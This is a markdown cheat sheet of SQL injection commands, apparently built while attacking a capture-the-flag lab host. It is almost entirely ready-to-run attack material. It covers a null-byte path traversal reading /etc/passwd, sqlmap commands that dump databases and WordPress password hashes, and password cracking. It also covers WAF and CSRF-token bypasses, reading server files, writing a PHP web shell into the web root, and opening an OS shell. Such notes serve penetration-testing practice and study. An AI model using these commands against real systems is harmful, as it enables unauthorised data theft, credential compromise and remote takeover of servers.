### Null byte. 
used to bypass control over data input in some fields
Just add %00 to end of ex. username in Login/Register in order to bypass check
http://vuln.example.com/phpscript.php?whatever=../../../etc/passwd%00

### SQLi Enumerations with SQLMap
sqlmap -u http://wekor.thm/it-next/it_cart.php --forms
You need to point to a php page with some form where you can insert stuff and do queries to website
The scan give us Injectable with "`coupon_code=&apply_coupon=Apply%20Coupon`" so let's try it

`sqlmap -u http://wekor.thm/it-next/it_cart.php --data "coupon_code=&apply_coupon=Apply%20Coupon" --dbs`
(will dump db info)

### Dump tables from a db
`sqlmap -u http://wekor.thm/it-next/it_cart.php --data "coupon_code=&apply_coupon=Apply%20Coupon" -D wordpress --tables`
(this time will dump all tables from Wordpress DB)

### Dump and crack the hashes
`sqlmap -u http://wekor.thm/it-next/it_cart.php --data "coupon_code=&apply_coupon=Apply%20Coupon" -D wordpress -T wp_users --dump`


### Show tables structure	
`sqlmap -u http://wekor.thm/it-next/it_cart.php --data "coupon_code=&apply_coupon=Apply%20Coupon" -D wordpress -T wp_users --colum`

### Dump only specific columns
`sqlmap -u http://wekor.thm/it-next/it_cart.php --data "coupon_code=&apply_coupon=Apply%20Coupon" -D wordpress -T wp_users -C Username,Password`
(this will dump only Username and Password columns from wp_users table)

### Value targeting
If you know that a specific value is SQLi vulnerable you can use * to target it.
EX: Cookie: id=1
(If you think that id=1 in cookie is inject-able the you can send in SQLmap `--cookie="id=1*"`)
(That asterisk on id in cookie will be tested for SQLi)

#### Use a request
If you catch a request in Burp you can save it with (Copy to File)
Then call the sqlmap with something like `sqlmap -r request.req`

### Hide errors
If you want to get rid of logs in output
`--parse-errors`

#### Save traffic logs
If you want to save traffic generates(output of verbose)
`-t /path/to/output.txt` 
 
 #### Proxy request thru Burpsuite
Setup Burpsuite in Intercept on
`--proxy HTTP:127.0.0.1:8080`

### Adjust levels
Tweaking the Risk/Levels will increase or decrease the number of test running.

```
--level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
--risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
```

### Prefix/Suffix 
There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.
 `--prefix=")" --suffix="-- -"`
(This will result in an enclosure of all vector values between the static prefix %')) and the suffix -- -)

### Union SQL tuning
In some cases, UNION SQLi payloads require extra user-provided information to work. 
If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option `--union-cols` (e.g. `--union-cols=5`)
Furthermore, in case there is a requirement to use an appendix at the end of a UNION query in the form of the FROM < table > (e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).
`--union-cols` (ships the number of columns)
` --union-from`  (ships the table from where to run the union)

### Filtered dump
 ` --where="name LIKE 'f%'"` 
 (Will query only rows matching contidion)


### Exclude sys-db from dump
` --dump-all --exclude-sysdbs` 
(Will dump everything excluding System DBs which usual are not relevant cause we canÂ´t read them)

### Dumping Schema only
`--schema`

### Search for something
`--search -T users`
(Acts LIKE operator, it have to be before something --search -C passwords = will search for all columns named passwords)

### Password cracking
`--passwords` 

### Bypass AntiCSFR token
`--data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`
(By specifying the token parameter name which should already be available within the provided request data, SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request)

### Unique value Bypass
( So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools.)
`--data="id=1&uid=99954" --randomize=uid`

### Calculated Parameter Bypass
(Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one)
`--eval="import hashlib; h=hashlib.md5(id).hexdigest()"`
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b

### Bypass Waf
`--random-agent`
(Uses random agent for Agent blacklists)
or
`--tamper=between,randomcase`
(One of most used tamper scritps for WAF bypass,BEWARE **randomcase** can fuckup some result chars)
or
`--chunked`
(Splits the POST request in smaller fragments called Chunks in order to avoid detection)

#### Check SA permission
`--is-dba`

### File read(need DBA permissions)
`--file-read "/etc/passwd"`

### File write(--secure-file-priv need to be off)
`--file-write "shell.php" --file-dest "/var/www/html/shell.php"`

### XP_CMDSHELL
`--os-shell`
(If you get error with default UNION try to set to ERROR  based or others --technique=E)
EX: `--os-shell --technique=E`